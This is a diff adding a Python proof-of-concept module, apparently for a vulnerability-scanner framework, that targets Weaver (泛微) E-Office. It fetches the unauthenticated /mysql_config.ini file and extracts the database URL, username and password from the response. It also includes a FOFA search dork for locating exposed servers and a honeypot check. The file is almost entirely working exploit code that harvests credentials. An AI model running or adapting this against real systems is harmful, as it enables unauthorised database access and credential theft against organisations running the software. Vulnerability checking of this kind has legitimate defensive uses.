+++ poc/Weaver_泛微OA/InfoDisclosure_mysql_config_ini/poc.py
@@ -1,0 +1,79 @@
+# coding:utf-8  
+import requests
+from lib.core.common import url_handle, get_random_ua, re_search_content, gen_title
+from lib.core.poc import POCBase
+# ...
+import urllib3
+
+urllib3.disable_warnings()
+
+
+class POC(POCBase):
+    _info = {
+        "author": "jijue",  # POC作者
+        "version": "1",  # POC版本，默认是1
+        "CreateDate": "2022-01-01",  # POC创建时间
+        "UpdateDate": "2022-01-01",  # POC创建时间
+        "PocDesc": """
+        略  
+        """,  # POC描述，写更新描述，没有就不写
+
+        "name": "泛微OA E-Office mysql_config.ini 数据库信息泄漏",  # 漏洞名称
+        "VulnID": "oFx-2022-0001",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "AppName": "泛微OA E-Office",  # 漏洞应用名称
+        "AppVersion": "",  # 漏洞应用版本
+        "VulnDate": "2022-01-01",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
+        "VulnDesc": """
+            泛微e-office系统是标准、易用、快速部署上线的专业协同OA软件,国内协同OA办公领域领导品牌，致力于为企业用户提供专业OA办公系统、移动OA应用等协同OA整体解决方案。
+            泛微OA e-office平台mysql_config.ini文件可未授权访问，攻击者通过漏洞可以获取数据库权限。
+        """,  # 漏洞简要描述
+
+        "fofa-dork": """
+            app="泛微-EOffice"
+        """,  # fofa搜索语句
+        "example": "",  # 存在漏洞的演示url，写一个就可以了
+        "exp_img": "",  # 先不管
+    }
+
+    def _verify(self):
+        """
+        返回vuln
+
+        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  
+
+        不存在漏洞：vuln = [False,""]
+        """
+        vuln = [False, ""]
+        url = self.target + "/mysql_config.ini"  # url自己按需调整
+
+        headers = {
+            "User-Agent": get_random_ua(),
+            "Connection": "close",
+            # "Content-Type": "application/x-www-form-urlencoded",
+        }
+
+        try:
+            """
+            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
+            """
+            req = requests.get(url, headers=headers, proxies=self.proxy, timeout=self.timeout, verify=False,
+                               allow_redirects=False)
+            if "datauser = " in req.text and req.status_code == 200 and "text/plain" in req.headers["Content-Type"]:
+                con = req.text.split("\r\n")
+                dburl = con[0]
+                dbuser = con[1]
+                dbpass = con[2]
+                vuln = [True, gen_title(dburl + " | " + dbuser + " | " + dbpass)]
+            else:
+                vuln = [False, req.text]
+        except Exception as e:
+            raise e
+
+        # 以下逻辑酌情使用
+        if self._honeypot_check(vuln[1]) == True:
+            vuln[0] = False
+
+        return vuln
+
+    def _attack(self):
+        return self._verify()